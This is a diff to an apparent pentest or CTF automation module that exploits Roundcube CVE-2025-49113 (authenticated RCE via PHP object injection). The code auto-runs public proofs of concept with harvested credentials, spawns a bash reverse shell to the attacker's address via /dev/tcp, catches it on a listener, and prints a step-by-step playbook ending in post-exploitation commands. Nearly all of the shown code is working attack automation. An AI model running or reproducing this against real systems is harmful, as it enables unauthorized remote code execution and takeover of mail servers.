@@ -97,7 +97,8 @@ def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
                          "(PHP object injection)", indent=1)
         host.add(Finding(
             title="Roundcube CVE-2025-49113 (authenticated RCE)",
-            detail=_playbook(base, version, creds) + "\n\n" + cred_line,
+            detail=_playbook(base, version, creds, _mail_domain(host, vhost))
+                   + "\n\n" + cred_line,
             severity="critical", category="vuln", port=_port(base),
             service="http", evidence=f"Roundcube {version}"))
     else:
@@ -114,19 +115,21 @@ def _report(host: HostReport, base: str, vhost: str, version: str) -> None:
             confidence="potential", evidence=f"Roundcube {version}"))
 
 
-def _playbook(base: str, version: str, creds: List[str]) -> str:
+def _playbook(base: str, version: str, creds: List[str], domain: str = "") -> str:
     login = creds[0] if creds else "<user>:<pass>"
     user, _, pw = login.partition(":")
     pw = pw or "<pass>"
+    domain = domain or "<domain>"
     return (
         f"Roundcube {version} at {base} is vulnerable to CVE-2025-49113 — an "
         "authenticated RCE via PHP object injection in the `_from` parameter "
         "(patched in 1.6.11 / 1.5.10). You already have a valid login.\n\n"
-        "# grab the public PoC (search Exploit-DB / GitHub for CVE-2025-49113),\n"
-        "# then let scryer run it automatically next time:\n"
-        "export SCRYER_RC_EXPLOIT=/path/to/CVE-2025-49113.py\n"
+        "# grab a public PoC, then let scryer run it automatically next time:\n"
+        "git clone https://github.com/fearsoff-org/CVE-2025-49113   # or "
+        "hakaioffsec/CVE-2025-49113-exploit, Zwique/CVE-2025-49113\n"
+        "export SCRYER_RC_EXPLOIT=$PWD/CVE-2025-49113/CVE-2025-49113.php\n"
         "# or run it by hand (start `nc -lvnp 4444` first):\n"
-        f"python3 CVE-2025-49113.py {base}/ {user} '{pw}' "
+        f"php CVE-2025-49113.php {base}/ {user} {domain} "
         "'bash -c \"bash -i >& /dev/tcp/YOUR_TUN0/4444 0>&1\"'\n"
         "# -> shell as the web user; then: cat /home/*/user.txt ; sudo -l")
 
@@ -158,6 +161,7 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
     utils.log("hot", f"authenticated to Roundcube as {user} — firing "
                      "CVE-2025-49113", indent=1)
 
+    domain = _mail_domain(host, vhost)
     att = _attacker_ip(host.resolved_ip or vhost)
     port = 4445
     catcher = _Catcher(port)
@@ -166,7 +170,7 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
         return False
     revsh = f"bash -c 'bash -i >& /dev/tcp/{att}/{port} 0>&1'"
     try:
-        ran = _run_exploit(host, base, vhost, user, pw, att, port, revsh)
+        ran = _run_exploit(host, base, vhost, user, pw, domain, att, port, revsh)
         if not ran:
             return False
         if not catcher.wait(25):
@@ -190,21 +194,30 @@ def _exploit(host: HostReport, base: str, vhost: str, version: str) -> bool:
         catcher.close()
 
 
-def _run_exploit(host, base, vhost, user, pw, att, port, revsh) -> bool:
+def _run_exploit(host, base, vhost, user, pw, domain, att, port, revsh) -> bool:
     """Execute the CVE. Prefer a local/public PoC or a metasploit module (the
     gadget chain is version-specific); fall back to a native best-effort request.
     """
     import os
     # 1) an operator-provided PoC script (most reliable for a version-specific
-    #    deserialization gadget). Point SCRYER_RC_EXPLOIT at the public PoC.
+    #    deserialization gadget). Point SCRYER_RC_EXPLOIT at any public PoC —
+    #    scryer runs it with the interpreter + arg order it expects.
     poc = os.environ.get("SCRYER_RC_EXPLOIT")
     if poc and os.path.isfile(poc):
-        py = tooling.resolve("python3") or "python3"
-        for argv in ([py, poc, base, user, pw, revsh],
-                     [py, poc, "-u", base, "-l", user, "-p", pw, "-c", revsh],
-                     [py, poc, "--url", base, "--user", user, "--password", pw,
-                      "--command", revsh]):
-            utils.log("info", f"running PoC: {os.path.basename(poc)} …", indent=2)
+        runner = ("php" if poc.lower().endswith(".php")
+                  else (tooling.resolve("python3") or "python3"))
+        runner = tooling.resolve(runner) or runner
+        url = base + "/"
+        # cover the signatures the public PoCs use:
+        #  fearsoff-org (php):  php x.php URL user domain command
+        #  common python:       x.py URL user pass command  /  -u -l -p -c
+        for argv in ([runner, poc, url, user, domain, revsh],
+                     [runner, poc, url, user, pw, revsh],
+                     [runner, poc, "-u", url, "-l", user, "-p", pw, "-c", revsh],
+                     [runner, poc, "--url", url, "--user", user,
+                      "--password", pw, "--command", revsh]):
+            utils.log("info", f"running PoC {os.path.basename(poc)} "
+                             f"({os.path.basename(runner)}) …", indent=2)
             try:
                 subprocess.run(argv, timeout=90, capture_output=True)
             except (OSError, subprocess.SubprocessError):
@@ -245,6 +258,17 @@ def _msf_module(msf: str, cve: str) -> Optional[str]:
         return None
     m = re.search(r"(exploit/[\w/]+)", out or "")
     return m.group(1) if m else None
+
+
+def _mail_domain(host: HostReport, vhost: str) -> str:
+    """The email domain for the login (kevin@<domain>) — from a harvested email,
+    else the registrable parent of the webmail vhost (mail001.enigma.htb ->
+    enigma.htb)."""
+    for e in host.__dict__.get("emails", set()):
+        if "@" in e:
+            return e.split("@", 1)[1]
+    labels = vhost.split(".")
+    return ".".join(labels[-2:]) if len(labels) >= 2 else vhost
 
 
 def _rc_login(opener, base, vhost, user, pw) -> bool:
